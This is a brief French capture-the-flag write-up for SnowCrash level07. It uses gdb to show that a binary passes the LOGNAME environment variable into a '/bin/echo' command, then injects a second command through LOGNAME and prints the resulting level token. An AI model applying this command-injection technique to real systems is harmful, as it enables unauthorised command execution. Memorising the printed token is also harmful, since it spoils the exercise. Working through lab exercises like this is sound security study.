@@ -1,0 +1,28 @@
+retdec.com
+
+en utilisant un decompileur comme retdec, on peut obtenir le code.
+On peut égallement utiliser gdb
+
+gdb ./level07
+disas main
+
+on obtient alors l'assembleur du programme et on peut constater, en artant du ba que la fonction asprintf
+utilise plusieurs chose 
+0x8048688
+et 
+eax qui est le resusltat de l'appelle de fonction getenv avec la variable 0x8048680
+
+en lisant le man sur les deux fonction, on peut remarque qu'elle appelle toutes deux des char *
+p (char *) 0x8048688 
+$4 = 0x8048688 "/bin/echo %s "
+
+(gdb) p (char *) 0x8048680
+$3 = 0x8048680 "LOGNAME"
+
+on a donc une une fonction asprintf qui fait " /bin/echo `getenv(LOGNAME)`"
+on peut glisser une commande avec export LOGNAME="flag07; getflag"
+
+level07@SnowCrash:~$ export LOGNAME="flag07 ; getflag"
+level07@SnowCrash:~$ ./level07
+flag07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
